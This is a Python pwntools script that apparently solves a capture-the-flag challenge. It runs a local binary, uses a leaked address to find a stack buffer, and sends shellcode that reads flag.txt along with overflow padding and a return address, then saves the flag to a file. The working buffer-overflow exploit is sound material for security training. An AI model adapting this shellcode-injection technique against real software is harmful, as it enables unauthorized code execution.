#!/usr/bin/env python3
from pwn import *
import re
flag_regex = re.compile("(InfoSec{.+[^}]})")
flag = ""

context.arch = "amd64"
shellcode = asm(shellcraft.amd64.cat("flag.txt"))
p = process("./main.elf")
main = p.recvuntil("Hi from")
main_addr = p.recvline()
offset = 0x1E8
buffer_addr = int(main_addr,16) - offset
buffer_addr_bytes = struct.pack("<Q", buffer_addr)
code  = shellcode + b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + buffer_addr_bytes
p.sendline(code)
flag = str(p.recvall(timeout = 1).decode())



#Print the flag
print(flag)
#Write the flag to the solution file
solution = open("solution.txt", "w")
solution.write(flag)
solution.close()